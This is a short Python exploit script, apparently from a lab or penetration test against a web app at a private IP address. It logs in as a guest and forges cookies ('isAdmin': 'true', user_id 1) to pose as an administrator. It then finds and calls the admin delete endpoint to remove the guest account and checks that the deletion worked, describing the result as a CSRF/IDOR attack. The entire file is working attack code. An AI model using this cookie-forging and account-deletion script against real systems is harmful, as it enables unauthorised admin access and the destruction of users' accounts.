import requests

target_login = "http://192.168.0.28:3000/login"
target_admin_users = "http://192.168.0.28:3000/admin/users"

# 1. Login as Guest to get their ID (or just check profile)
s = requests.Session()
res = s.post(target_login, data={'username': 'guest', 'password': 'guest123'})
print(f"Guest Login: {res.status_code}")
if 'user_id' in s.cookies:
    guest_id = s.cookies['user_id']
    print(f"Guest ID is: {guest_id}")
    
    # 2. Login as Admin
    s.cookies.clear()
    s.cookies.update({'user': 'admin', 'isAdmin': 'true', 'user_id': '1'})
    
    # 3. Try to delete Guest (CSRF check)
    # Assuming delete endpoint is /admin/users/delete/<id> or POST to /admin/users/<id>/delete
    # Let's inspect /admin/users page first to find the link/form
    res_admin = s.get(target_admin_users)
    if f"/delete/{guest_id}" in res_admin.text:
         print(f"Found delete link for ID {guest_id}")
         # Attempt DELETE (GET or POST)
         delete_url = f"http://192.168.0.28:3000/admin/users/delete/{guest_id}"
         print(f"Attacking: {delete_url}")
         res_del = s.get(delete_url) # Try GET first
         if res_del.status_code == 200 or res_del.status_code == 302:
             print("[+] Delete request sent. Checking if user still exists...")
             # Check if we can login as guest
             res_check = requests.post(target_login, data={'username': 'guest', 'password': 'guest123'})
             if "Login Failed" in res_check.text or res_check.status_code != 302: # Assuming 302 is success
                 print("[+] User 'guest' successfully DELETED via CSRF/IDOR.")
             else:
                 print("[-] Guest still can login. Delete might failed.")
    else:
        print("[-] Could not find explicit delete link in admin page.")
        # Check source for form
        if "form action" in res_admin.text:
            print("Found forms: ")
            for line in res_admin.text.splitlines():
                if "form" in line:
                    print(line.strip())

else:
    print("[-] Could not determine guest ID.")

